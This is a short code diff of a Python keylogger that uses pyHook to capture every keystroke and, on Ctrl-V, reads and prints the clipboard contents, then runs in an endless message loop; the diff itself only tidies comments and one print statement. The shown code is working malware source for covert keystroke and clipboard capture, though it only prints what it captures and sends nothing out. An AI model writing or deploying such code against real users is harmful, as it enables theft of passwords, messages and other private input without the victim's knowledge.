@@ -45,20 +45,17 @@ def KeyStroke(event):
     if event.Ascii > 32 and event.Ascii < 127:
         print(chr(event.Ascii),)
     else:
-        # if [Ctrl-V], get the value on the clipboard
         if event.Key == "V":
             win32clipboard.OpenClipboard()
             pasted_value = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
             print("[PASTE] - %s" % (pasted_value),)
         else:
-            print("[%s]" % event.Key,)
+            print("[%s]" % (event.Key),)
     return True
 
-# create and register a hook manager 
+# create and register a hook manager, execute forever
 kl         = pyHook.HookManager()
 kl.KeyDown = KeyStroke
-
-# register the hook and execute forever
 kl.HookKeyboard()
 pythoncom.PumpMessages()
